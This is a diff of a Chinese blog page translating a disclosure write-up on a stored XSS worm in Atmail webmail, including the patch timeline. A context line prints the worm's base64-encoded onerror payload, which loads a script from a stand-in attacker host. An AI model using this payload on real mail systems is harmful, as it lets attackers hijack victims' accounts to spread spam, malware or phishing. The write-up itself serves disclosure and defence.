@@ -98,7 +98,7 @@
 <meta property="og:site_name" content="Ꭰ&#39;s security blog">
 <meta property="og:description" content="～今天肯定得犯困～  本文由高级安全分析师Zach Julian编写。你可以在推特上联系他。 Atmail是一家以云端和本地电子邮件服务著名的供应商。Atmail的客户有普通公司、主机供应商以及包括DreamHost、美国的LegalShield、波斯尼亚的m:tel、iiNet和澳大利亚的Optus互联网服务供应商。">
 <meta property="og:image" content="/2017/06/26/how-I-built-an-xss-worm-on-atmail/DreamHost1.png">
-<meta property="og:updated_time" content="2017-06-26T01:40:15.000Z">
+<meta property="og:updated_time" content="2017-06-26T01:48:19.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【译】看我如何在atmail上构建xss蠕虫">
 <meta name="twitter:description" content="～今天肯定得犯困～  本文由高级安全分析师Zach Julian编写。你可以在推特上联系他。 Atmail是一家以云端和本地电子邮件服务著名的供应商。Atmail的客户有普通公司、主机供应商以及包括DreamHost、美国的LegalShield、波斯尼亚的m:tel、iiNet和澳大利亚的Optus互联网服务供应商。">
@@ -415,7 +415,7 @@
 <p>上面这个payload在页面的head元素中创建了引用了托管的恶意javascript代码的script标签。最终payload也是base64编码的：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img longdesc=<span class="string">"src='x'onerror=eval(window.atob('aW5jbHVkZT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtpbmNsdWRlLnNyYz0naHR0cHM6Ly9hdHRhY2tlci5jb20vYXRtYWlsLmpzJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGluY2x1ZGUpOw=='));//&gt;&lt;img "</span> src=<span class="string">'showme'</span>&gt;</div></pre></td></tr></table></figure>
 <p>万事俱备，蠕虫已经发作。视频详细展示了它的行为：<a href="https://youtu.be/pIfAAyQ8ggY" target="_blank" rel="external">点我</a>(Youtube视频，请自带梯子)</p>
-<p>垃圾信息发布者和其他恶意行为者通过atmail的xss蠕虫获取利益，他们可以操控受害者向熟人发送任意信息。因为蠕虫的病毒天性和额外的信任（邮件是来自熟人），这种攻击非常适合谣言、恶意软件传播或钓鱼攻击。</p>
+<p>垃圾信息发布者和其他恶意行为者通过atmail的xss蠕虫获取利益，他们可以操控受害者向熟人发送任意信息。因为蠕虫的病毒天性和邮件是来自熟人的附加信任特性，这种攻击非常适合谣言、恶意软件传播或钓鱼攻击。</p>
 <h1 id="信息披漏时间线"><a href="#信息披漏时间线" class="headerlink" title="信息披漏时间线"></a>信息披漏时间线</h1><p>在发现这个漏洞后，我开始对atmail的信息披漏负责。截至2017年5月25日，他们已经修复了这个问题，将atmail升级到版本7.8.0.2即可。</p>
 <ul>
 <li>2017-02-24  报告漏洞</li>
